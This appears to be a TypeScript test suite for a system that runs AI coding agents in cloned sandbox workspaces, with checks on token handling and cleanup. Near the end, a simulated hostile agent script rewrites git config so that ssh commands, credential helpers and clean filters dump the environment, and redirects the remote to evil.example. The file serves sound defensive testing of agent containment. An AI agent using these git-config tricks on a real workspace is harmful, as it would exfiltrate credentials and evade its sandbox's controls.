import assert from 'node:assert/strict';
import { execFileSync, spawn } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { PassThrough } from 'node:stream';
import { test } from 'node:test';

const { AgentRunSpecBuilder, agentRunNetwork } = await import('../packages/core/src/agents/runtime/agentRunSpec.ts');
const { BindWorkspaceTransport, runWithWorkspaceTransport, WorkspaceTransportError } = await import('../packages/core/src/git/workspaceTransport.ts');
const { resolveWorkspaceTransportMode, runtimeWorkspaceTransports, WORKSPACE_TRANSPORT_ENV } = await import('../packages/core/src/git/workspaceTransportMode.ts');
const { CloneWorkspaceTransport, parseGitHubRepository } = await import('../packages/core/src/git/workspaceCloneTransport.ts');
const { WORKSPACE_TRANSPORT_ENVIRONMENT, WORKSPACE_TRANSPORT_RESULT_DIR, WORKSPACE_TRANSPORT_TOKEN_ENV, WORKSPACE_BOOTSTRAP_FAILURE_EXIT } = await import('../packages/core/src/git/workspaceTransportScript.ts');

import type { AgentRunHandle, AgentRunResult, AgentRunSpec, AgentRuntime } from '../packages/core/src/agents/runtime/types.ts';

const TOKEN = 'ghs_workspaceTransportTestToken0123456789';

function git(cwd: string, ...args: string[]): string {
    return execFileSync('git', args, {
        cwd, encoding: 'utf8',
        env: { ...process.env, GIT_AUTHOR_NAME: 't', GIT_AUTHOR_EMAIL: 't@t', GIT_COMMITTER_NAME: 't', GIT_COMMITTER_EMAIL: 't@t', GIT_CONFIG_NOSYSTEM: '1' },
    }).trimEnd();
}

function write(file: string, content: string, mode?: number): void {
    fs.mkdirSync(path.dirname(file), { recursive: true });
    fs.writeFileSync(file, content, mode ? { mode } : undefined);
}

interface Fixture {
    root: string; remote: string; worktree: string; sandbox: string; resultDir: string; base: string;
    minted: string[]; revoked: string[];
    transport: InstanceType<typeof CloneWorkspaceTransport>;
}

function fixture(): Fixture {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'propr-ws-transport-'));
    const remote = path.join(root, 'remote.git');
    git(root, 'init', '-q', '--bare', '-b', 'main', remote);
    const seed = path.join(root, 'seed');
    git(root, 'init', '-q', '-b', 'main', seed);
    write(path.join(seed, 'a.txt'), 'original\n');
    write(path.join(seed, 'remove-me.txt'), 'bye\n');
    write(path.join(seed, '.gitignore'), '.propr/previews/\nnode_modules/\n');
    git(seed, 'add', '-A');
    git(seed, 'commit', '-q', '-m', 'seed');
    git(seed, 'push', '-q', remote, 'main');
    const clone = path.join(root, 'clone');
    git(root, 'clone', '-q', remote, clone);
    // The worker clone points at GitHub; the transport's remote resolver maps it to the local bare repository.
    git(clone, 'remote', 'set-url', 'origin', 'https://github.com/acme/widgets.git');
    const worktree = path.join(root, 'worktree');
    git(clone, 'worktree', 'add', '-q', '-b', 'task-1', worktree, 'origin/main');
    write(path.join(worktree, 'node_modules/kept.js'), 'ignored, must survive\n');
    const minted: string[] = [];
    const revoked: string[] = [];
    const transport = new CloneWorkspaceTransport({
        mintToken: async (repository, access) => { minted.push(`${repository.owner}/${repository.repo}:${access}`); return TOKEN; },
        revokeToken: async token => { revoked.push(token); },
        workerToken: async () => undefined,
        remoteUrl: () => remote,
        createRunId: () => 'run-1',
    });
    return {
        root, remote, worktree, sandbox: path.join(root, 'sandbox'), resultDir: path.join(root, 'result'),
        base: git(worktree, 'rev-parse', 'HEAD'), minted, revoked, transport,
    };
}

/** The agent: edits the cloned workspace, proves it cannot see the token, and records its prompt. */
const AGENT_SCRIPT = `#!/bin/bash
set -e
[ -z "\${${WORKSPACE_TRANSPORT_TOKEN_ENV}:-}" ] || { echo "token leaked into agent" >&2; exit 42; }
grep -rq "${TOKEN}" .git && { echo "token persisted in .git" >&2; exit 43; }
cat > prompt.seen
echo changed > a.txt
rm remove-me.txt
echo new > new.txt
mkdir -p .propr/previews && echo png > .propr/previews/shot.png
if [ "\${AGENT_COMMITS:-0}" = 1 ]; then git add -A && git -c user.name=a -c user.email=a@a commit -q -m "agent commit"; echo after > after.txt; fi
exit "\${AGENT_EXIT:-0}"
`;

function runSpec(f: Fixture, overrides: { readOnly?: boolean; gitWritable?: boolean; env?: Record<string, string> } = {}): AgentRunSpec {
    const agent = path.join(f.root, 'agent.sh');
    write(agent, AGENT_SCRIPT, 0o755);
    const builder = new AgentRunSpecBuilder({
        agentType: 'claude', image: 'propr/agent:test', name: 'claude-issue-1-abc', stdin: true,
        network: agentRunNetwork('bridge'),
        workspace: { hostPath: f.worktree, containerPath: f.sandbox, readOnly: overrides.readOnly ?? false },
    }).workspaceMount()
        .bind('/tmp/git-processor', '/tmp/git-processor', !overrides.gitWritable, 'git')
        .bind('/creds', '/home/node/.claude', false, 'credential')
        .env('GH_TOKEN', 'read-only');
    for (const [name, value] of Object.entries(overrides.env ?? {})) builder.env(name, value);
    const spec = builder.build();
    spec.repoSetup = { agentType: 'claude', shell: '/bin/bash', script: 'exec "$0" "$@"', providerEntrypoint: agent, env: [] };
    return spec;
}

type Result = AgentRunResult;
interface LocalRuntime extends AgentRuntime<{ extraEnvVars?: Record<string, string>; stdinData?: string; abortAfterMs?: number }, Result> {
    started: Array<{ spec: AgentRunSpec; extraEnvVars?: Record<string, string> }>;
    released: number;
}

/**
 * Runs the rendered transport wrapper locally with bash, exactly as the
 * container entrypoint would, mapping the sandbox result directory to a host
 * directory for the runtime file API.
 */
function localRuntime(f: Fixture, setup: { pathPrefix?: string } = {}): LocalRuntime {
    const tmp = path.join(f.root, 'tmp');
    fs.mkdirSync(tmp, { recursive: true });
    const runtime: LocalRuntime = {
        kind: 'local', started: [], released: 0,
        capabilities: { supportsBindMounts: false, supportsRestrictedNetwork: false, supportsMcpPrivateNetwork: false, reattach: false, workspaceTransports: ['clone'] },
        start(spec, options = {}) {
            runtime.started.push({ spec, extraEnvVars: options.extraEnvVars });
            const clone = spec.workspace.clone!;
            const systemPath = process.env.PATH ?? '/usr/bin:/bin';
            const env: Record<string, string> = { PATH: setup.pathPrefix ? `${setup.pathPrefix}:${systemPath}` : systemPath, HOME: f.root, TMPDIR: tmp };
            for (const variable of [...spec.env].sort((a, b) => a.order - b.order)) {
                const value = variable.value ?? options.extraEnvVars?.[variable.name];
                if (value !== undefined) env[variable.name] = value;
            }
            env[WORKSPACE_TRANSPORT_ENVIRONMENT.resultDir] = f.resultDir;
            const child = spawn('/bin/bash', ['-c', clone.script, spec.repoSetup!.script, spec.repoSetup!.providerEntrypoint, ...spec.args], { env, detached: true });
            const stdout = new PassThrough();
            const stderr = new PassThrough();
            let err = '';
            child.stdout.pipe(stdout);
            child.stderr.on('data', chunk => { err += chunk; });
            child.stderr.pipe(stderr);
            child.stdin.end(options.stdinData ?? '');
            const result = new Promise<Result>((resolve, reject) => {
                if (options.abortAfterMs !== undefined) {
                    // Like a container kill: the whole process tree goes.
                    setTimeout(() => { process.kill(-child.pid!, 'SIGKILL'); reject(new Error('Execution aborted by worker')); }, options.abortAfterMs);
                }
                child.on('close', code => resolve({ stdout: '', stderr: err, exitCode: code, messageTimestamps: new Map() }));
            });
            const handle: AgentRunHandle<Result> = {
                spec, stdout, stderr,
                wait: () => result,
                stop: async () => { child.kill('SIGTERM'); },
                inspect: async () => ({ liveness: 'stopped', name: spec.name }),
                isAlive: async () => false,
                readFile: async file => {
                    const local = path.join(f.resultDir, path.posix.relative(WORKSPACE_TRANSPORT_RESULT_DIR, file));
                    return fs.existsSync(local) ? fs.readFileSync(local) : null;
                },
                release: async () => { runtime.released++; },
            };
            return handle;
        },
    };
    return runtime;
}

function remoteRunRefs(f: Fixture): string {
    return git(f.root, 'ls-remote', f.remote, 'refs/propr/*');
}

function grepToken(directory: string): string {
    try { return execFileSync('grep', ['-rl', TOKEN, directory], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore'] }).trim(); }
    catch { return ''; }
}

test('mode resolution: spec, then PROPR_WORKSPACE_TRANSPORT, then bind where the runtime bind-mounts', () => {
    const capabilities = { supportsBindMounts: true, supportsRestrictedNetwork: true, supportsMcpPrivateNetwork: true, reattach: false };
    const workspace = { hostPath: '/w', containerPath: '/home/node/workspace', readOnly: false };
    assert.equal(resolveWorkspaceTransportMode({ workspace }, capabilities, {}), 'bind');
    assert.equal(resolveWorkspaceTransportMode({ workspace }, { ...capabilities, supportsBindMounts: false }, {}), 'clone');
    assert.equal(resolveWorkspaceTransportMode({ workspace }, capabilities, { [WORKSPACE_TRANSPORT_ENV]: 'Clone' }), 'clone');
    assert.equal(resolveWorkspaceTransportMode({ workspace: { ...workspace, mode: 'bind' } }, capabilities, { [WORKSPACE_TRANSPORT_ENV]: 'clone' }), 'bind');
    assert.throws(() => resolveWorkspaceTransportMode({ workspace }, capabilities, { [WORKSPACE_TRANSPORT_ENV]: 'rsync' }), /Unknown workspace transport "rsync".*PROPR_WORKSPACE_TRANSPORT/);
    assert.deepEqual(runtimeWorkspaceTransports(capabilities), ['bind']);
    assert.deepEqual(runtimeWorkspaceTransports({ ...capabilities, supportsBindMounts: false }), []);
    assert.deepEqual(parseGitHubRepository('https://x-access-token:abc@github.com/acme/widgets.git'), { owner: 'acme', repo: 'widgets' });
    assert.deepEqual(parseGitHubRepository('git@github.com:acme/widgets'), { owner: 'acme', repo: 'widgets' });
    assert.throws(() => parseGitHubRepository('/srv/repo.git'), WorkspaceTransportError);
});

test('bind mode passes the spec through and edits the worktree in place', async () => {
    const spec = runSpec(fixture());
    const prepared = await new BindWorkspaceTransport().prepare(spec);
    assert.equal(prepared.spec, spec);
    assert.deepEqual(prepared.launchEnvironment, {});
    assert.deepEqual(await prepared.complete({} as AgentRunHandle, { stdout: '', stderr: '', exitCode: 0, messageTimestamps: new Map() }), { applied: true });
});

test('clone mode: the run clones the base, the worker applies its result as uncommitted changes, refs and token are cleaned up', async () => {
    const f = fixture();
    const runtime = localRuntime(f);
    const result = await runWithWorkspaceTransport(runtime, runSpec(f), { stdinData: 'the prompt' }, { transport: f.transport });
    assert.equal(result.exitCode, 0, result.stderr);

    const [{ spec, extraEnvVars }] = runtime.started;
    assert.equal(spec.workspace.mode, 'clone');
    assert.deepEqual(spec.mounts.map(mount => mount.purpose), ['credential'], 'neither the worktree nor git metadata is mounted');
    const tokenVariable = spec.env.find(variable => variable.name === WORKSPACE_TRANSPORT_TOKEN_ENV);
    assert.ok(tokenVariable && tokenVariable.value === undefined, 'the token is referenced by name only');
    assert.ok(!JSON.stringify(spec).includes(TOKEN), 'the token never enters the spec');
    assert.equal(extraEnvVars?.[WORKSPACE_TRANSPORT_TOKEN_ENV], TOKEN);
    assert.deepEqual(f.minted, ['acme/widgets:write']);
    assert.equal(spec.workspace.clone!.baseCommit, f.base);

    // The worker owns the commit: branch and HEAD unchanged, the run's work is uncommitted.
    assert.equal(git(f.worktree, 'rev-parse', 'HEAD'), f.base);
    assert.equal(git(f.worktree, 'symbolic-ref', '--short', 'HEAD'), 'task-1');
    assert.equal(fs.readFileSync(path.join(f.worktree, 'a.txt'), 'utf8'), 'changed\n');
    assert.equal(fs.readFileSync(path.join(f.worktree, 'prompt.seen'), 'utf8'), 'the prompt');
    assert.ok(!fs.existsSync(path.join(f.worktree, 'remove-me.txt')));
    assert.ok(fs.existsSync(path.join(f.worktree, '.propr/previews/shot.png')), 'ignored preview evidence is returned');
    assert.ok(fs.existsSync(path.join(f.worktree, 'node_modules/kept.js')), 'worker-side ignored files survive');
    assert.deepEqual(git(f.worktree, 'status', '--porcelain').split('\n').sort(), [' D remove-me.txt', ' M a.txt', '?? new.txt', '?? prompt.seen']);

    assert.equal(remoteRunRefs(f), '', 'temporary refs are deleted');
    assert.equal(git(f.worktree, 'for-each-ref', 'refs/propr'), '');
    assert.deepEqual(f.revoked, [TOKEN]);
    assert.equal(runtime.released, 1);
    assert.equal(grepToken(f.sandbox), '', 'the token is not persisted in the sandbox');
    assert.equal(grepToken(f.resultDir), '');
});

test('clone mode falls back to a bundle read through the runtime file API when the result push is refused', async () => {
    const f = fixture();
    const runtime = localRuntime(f);
    const prepared = await f.transport.prepare(runSpec(f));
    // The remote refuses the result ref (its ref directory is not writable).
    const runRefs = path.join(f.remote, 'refs/propr/runs/run-1');
    fs.chmodSync(runRefs, 0o555);
    const handle = runtime.start(prepared.spec, { extraEnvVars: { ...prepared.launchEnvironment } });
    const result = await handle.wait();
    assert.equal(result.exitCode, 0, result.stderr);
    assert.match(fs.readFileSync(path.join(f.resultDir, 'status'), 'utf8'), /^bundle [0-9a-f]{40}\n$/);
    const outcome = await prepared.complete(handle, result);
    assert.equal(outcome.applied, true);
    assert.equal(outcome.via, 'bundle');
    assert.equal(fs.readFileSync(path.join(f.worktree, 'new.txt'), 'utf8'), 'new\n');
    fs.chmodSync(runRefs, 0o755);
    await prepared.cleanup(handle);
    assert.equal(remoteRunRefs(f), '');
    assert.deepEqual(f.revoked, [TOKEN]);
    assert.equal(grepToken(f.resultDir), '');
});

test('a pushed result whose worker fetch fails keeps the result ref and the kept run, and still revokes the token', async () => {
    const f = fixture();
    const runtime = localRuntime(f);
    const prepared = await f.transport.prepare(runSpec(f));
    const handle = runtime.start(prepared.spec, { extraEnvVars: { ...prepared.launchEnvironment } });
    const result = await handle.wait();
    assert.equal(result.exitCode, 0, result.stderr);
    const [state, snapshot] = fs.readFileSync(path.join(f.resultDir, 'status'), 'utf8').trim().split(' ');
    assert.equal(state, 'pushed', 'the sandbox pushed its result, so no bundle fallback exists');
    // A transient outage: the remote is unreachable for the worker's fetch, then recovers before cleanup.
    const away = `${f.remote}.away`;
    fs.renameSync(f.remote, away);
    await assert.rejects(prepared.complete(handle, result),
        /returned no workspace result.*kept for recovery at refs\/propr\/runs\/run-1\/result on .* and the kept run/);
    fs.renameSync(away, f.remote);
    await prepared.cleanup(handle);

    assert.equal(git(f.worktree, 'status', '--porcelain'), '', 'nothing was applied');
    assert.deepEqual(f.revoked, [TOKEN], 'credentials are revoked even though the result is kept');
    assert.equal(runtime.released, 0, 'the kept run is not released while it may hold the only bundle');
    assert.equal(remoteRunRefs(f), `${snapshot}\trefs/propr/runs/run-1/result`, 'only the base ref is deleted');
    // The kept ref really recovers the run's work.
    git(f.worktree, 'fetch', '-q', f.remote, 'refs/propr/runs/run-1/result');
    assert.equal(git(f.worktree, 'show', 'FETCH_HEAD:new.txt'), 'new');
});

test('a retrieved result that cannot be applied stays on the worker\'s local ref', async () => {
    const f = fixture();
    const runtime = localRuntime(f);
    const prepared = await f.transport.prepare(runSpec(f));
    const handle = runtime.start(prepared.spec, { extraEnvVars: { ...prepared.launchEnvironment } });
    const result = await handle.wait();
    assert.equal(result.exitCode, 0, result.stderr);
    // The worktree moves during the run, so the fetched result must not be laid over it.
    git(f.worktree, 'commit', '-q', '--allow-empty', '-m', 'moved');
    await assert.rejects(prepared.complete(handle, result), /moved from .* kept for recovery at refs\/propr\/runs\/run-1 in /);
    await prepared.cleanup(handle);

    assert.equal(git(f.worktree, 'show', 'refs/propr/runs/run-1:new.txt'), 'new', 'the local ref keeps the snapshot');
    assert.equal(remoteRunRefs(f), '', 'sandbox copies are discarded once the worker holds the result');
    assert.deepEqual(f.revoked, [TOKEN]);
    assert.equal(runtime.released, 1);
});

test('clone mode keeps a failed run\'s partial work and returns its exit status', async () => {
    const f = fixture();
    const runtime = localRuntime(f);
    const result = await runWithWorkspaceTransport(runtime, runSpec(f, { env: { AGENT_EXIT: '3' } }), {}, { transport: f.transport });
    assert.equal(result.exitCode, 3);
    assert.equal(fs.readFileSync(path.join(f.worktree, 'a.txt'), 'utf8'), 'changed\n');
    assert.equal(remoteRunRefs(f), '');
    assert.deepEqual(f.revoked, [TOKEN]);
});

test('an aborted clone-mode run applies nothing and still cleans up refs, token and the kept run', async () => {
    const f = fixture();
    const runtime = localRuntime(f);
    write(path.join(f.root, 'slow.sh'), '#!/bin/bash\necho partial > a.txt\nsleep 30\n', 0o755);
    const spec = runSpec(f);
    spec.repoSetup!.providerEntrypoint = path.join(f.root, 'slow.sh');
    await assert.rejects(runWithWorkspaceTransport(runtime, spec, { abortAfterMs: 1500 }, { transport: f.transport }), /aborted/);
    assert.equal(git(f.worktree, 'status', '--porcelain'), '', 'nothing from the aborted run reaches the worktree');
    assert.equal(fs.readFileSync(path.join(f.worktree, 'a.txt'), 'utf8'), 'original\n');
    assert.equal(remoteRunRefs(f), '');
    assert.deepEqual(f.revoked, [TOKEN]);
    assert.equal(runtime.released, 1);
});

test('a run whose workspace cannot be bootstrapped fails without touching the worktree', async () => {
    const f = fixture();
    const runtime = localRuntime(f);
    write(path.join(f.sandbox, 'leftover'), 'not empty');
    const result = await runWithWorkspaceTransport(runtime, runSpec(f), {}, { transport: f.transport });
    assert.equal(result.exitCode, WORKSPACE_BOOTSTRAP_FAILURE_EXIT);
    assert.match(result.stderr, /is not empty/);
    assert.equal(git(f.worktree, 'status', '--porcelain'), '');
    assert.equal(remoteRunRefs(f), '');
    assert.deepEqual(f.revoked, [TOKEN]);
});

test('clone mode refuses a dirty worktree before publishing anything or minting a token', async () => {
    const f = fixture();
    write(path.join(f.worktree, 'a.txt'), 'local edit\n');
    await assert.rejects(f.transport.prepare(runSpec(f)), /uncommitted changes/);
    assert.equal(remoteRunRefs(f), '');
    assert.deepEqual(f.minted, []);
});

test('when the agent owns git, its commits move the task branch and the rest stays uncommitted', async () => {
    const f = fixture();
    const runtime = localRuntime(f);
    const result = await runWithWorkspaceTransport(runtime, runSpec(f, { gitWritable: true, env: { AGENT_COMMITS: '1' } }), {}, { transport: f.transport });
    assert.equal(result.exitCode, 0, result.stderr);
    assert.notEqual(git(f.worktree, 'rev-parse', 'HEAD'), f.base);
    assert.equal(git(f.worktree, 'log', '-1', '--format=%s'), 'agent commit');
    assert.equal(git(f.worktree, 'status', '--porcelain'), '?? after.txt');
});

test('a read-only clone gets a read token and returns nothing', async () => {
    const f = fixture();
    const runtime = localRuntime(f);
    const result = await runWithWorkspaceTransport(runtime, runSpec(f, { readOnly: true }), {}, { transport: f.transport });
    assert.equal(result.exitCode, 0, result.stderr);
    assert.deepEqual(f.minted, ['acme/widgets:read']);
    assert.equal(runtime.started[0].spec.workspace.clone!.resultRef, undefined);
    assert.equal(git(f.worktree, 'status', '--porcelain'), '');
    assert.equal(remoteRunRefs(f), '');
});

/**
 * A hostile agent: rewrites the workspace's git configuration (and its global
 * one) so any git command run there would execute its programs, and records
 * what those programs see.
 */
const HOSTILE_AGENT_SCRIPT = `#!/bin/bash
set -e
evidence="$HOSTILE_EVIDENCE"
cat > "$evidence/steal.sh" <<'STEAL'
#!/bin/bash
env > "$HOSTILE_EVIDENCE/ssh-command.env"
exit 1
STEAL
cat > "$evidence/filter.sh" <<'FILTER'
#!/bin/bash
{ echo "USER=\${USER:-}"; env; cat /proc/$PPID/environ 2>/dev/null | tr '\\0' '\\n'; } >> "$HOSTILE_EVIDENCE/clean-filter.env"
cat
FILTER
chmod +x "$evidence/steal.sh" "$evidence/filter.sh"
for scope in --local --global; do
    git config $scope core.sshCommand "$evidence/steal.sh"
    git config $scope url.ssh://git@evil.example/.insteadOf "$PROPR_WORKSPACE_CLONE_REMOTE"
    git config $scope url.ssh://git@evil.example/.pushInsteadOf "$PROPR_WORKSPACE_CLONE_REMOTE"
    git config $scope credential.helper "!$evidence/steal.sh"
done
git remote set-url origin ssh://git@evil.example/acme/widgets.git
git remote set-url --push origin ssh://git@evil.example/acme/widgets.git
git config filter.hostile.clean "$evidence/filter.sh"
git config filter.hostile.required true
echo '*.txt filter=hostile' > .gitattributes
echo hostile > a.txt
`;

function hostileRun(f: Fixture): { spec: AgentRunSpec; evidence: string } {
    const evidence = path.join(f.root, 'evidence');
    fs.mkdirSync(evidence);
    const agent = path.join(f.root, 'hostile.sh');
    write(agent, HOSTILE_AGENT_SCRIPT, 0o755);
    const spec = runSpec(f, { env: { HOSTILE_EVIDENCE: evidence } });
    spec.repoSetup!.providerEntrypoint = agent;
    return { spec, evidence };
}

function assertCredentialIsolated(f: Fixture, evidence: string, runtime: LocalRuntime): void {
    assert.ok(!fs.existsSync(path.join(evidence, 'ssh-command.env')), 'agent-configured ssh command or credential helper never runs');
    const authHeader = Buffer.from(`x-access-token:${TOKEN}`).toString('base64');
    const seenByFilter = fs.readFileSync(path.join(evidence, 'clean-filter.env'), 'utf8');
    assert.ok(!seenByFilter.includes(TOKEN) && !seenByFilter.includes(authHeader), 'agent clean filter never sees the credential');
    assert.ok(!seenByFilter.includes('extraheader'), 'agent clean filter never sees the transport git configuration');
    assert.match(fs.readFileSync(path.join(f.resultDir, 'status'), 'utf8'), /^pushed [0-9a-f]{40}\n$/, 'the result reaches the fixed remote');
    assert.equal(fs.readFileSync(path.join(f.worktree, 'a.txt'), 'utf8'), 'hostile\n');
    assert.deepEqual(f.revoked, [TOKEN]);
    assert.equal(runtime.released, 1);
    assert.deepEqual(fs.readdirSync(path.join(f.root, 'tmp')), [], 'the private transport repository and stage are removed');
}

test('agent-controlled git configuration cannot select programs or URLs for credentialed transport operations', async () => {
    const f = fixture();
    const runtime = localRuntime(f);
    const { spec, evidence } = hostileRun(f);
    const result = await runWithWorkspaceTransport(runtime, spec, {}, { transport: f.transport });
    assert.equal(result.exitCode, 0, result.stderr);
    assertCredentialIsolated(f, evidence, runtime);
});

test('a privileged wrapper snapshots the workspace as the agent user, so agent filters run unprivileged', async () => {
    const f = fixture();
    // Simulate a root wrapper with an unprivileged node user: `id` reports root, `su-exec` records the drop.
    const bin = path.join(f.root, 'bin');
    const drops = path.join(f.root, 'su-exec.log');
    write(path.join(bin, 'id'), '#!/bin/bash\ncase "$*" in\n  -u) echo 0 ;;\n  node) echo "uid=1000(node)" ;;\n  "-u node") echo 1000 ;;\n  *) exec /usr/bin/id "$@" ;;\nesac\n', 0o755);
    write(path.join(bin, 'su-exec'), `#!/bin/bash\nprintf '%s\\n' "$*" >> ${JSON.stringify(drops)}\nshift\nexec "$@"\n`, 0o755);
    write(path.join(bin, 'chown'), '#!/bin/bash\nexit 0\n', 0o755);
    const runtime = localRuntime(f, { pathPrefix: bin });
    const { spec, evidence } = hostileRun(f);
    const result = await runWithWorkspaceTransport(runtime, spec, {}, { transport: f.transport });
    assert.equal(result.exitCode, 0, result.stderr);
    assert.match(fs.readFileSync(drops, 'utf8'), /^node env HOME=\/home\/node USER=node LOGNAME=node \/bin\/bash -c [^]*\n propr-snapshot \//);
    assert.match(fs.readFileSync(path.join(evidence, 'clean-filter.env'), 'utf8'), /^USER=node$/m, 'the clean filter ran as the agent user');
    assertCredentialIsolated(f, evidence, runtime);
});
